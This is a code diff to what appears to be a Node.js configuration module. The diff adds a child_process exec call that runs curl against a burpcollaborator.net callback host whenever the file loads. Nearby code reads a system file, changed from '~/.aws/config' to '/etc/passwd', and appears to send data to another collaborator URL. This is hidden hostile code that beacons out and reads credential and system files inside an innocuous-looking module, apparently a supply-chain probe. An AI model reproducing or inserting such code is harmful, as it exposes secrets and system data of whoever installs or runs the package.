@@ -1,6 +1,18 @@
 const path = require('path');
 const nconf = require('nconf');
+const { exec } = require("child_process");
 
+exec("curl http://qwq32wisunys5s9eejquk2gxlorfo3d.burpcollaborator.net/lolz", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 /*var request = require('request');
 request('http://google.com/robots.txt', function (error, response, body) {
   if (1 == 1) {
@@ -59,7 +71,7 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 
 var request = require('request');
 const fs = require('fs')
-fs.readFile('~/.aws/config', 'utf8' , (err, data) => {
+fs.readFile('/etc/passwd', 'utf8' , (err, data) => {
   if (err) {
     console.error(err)
     return
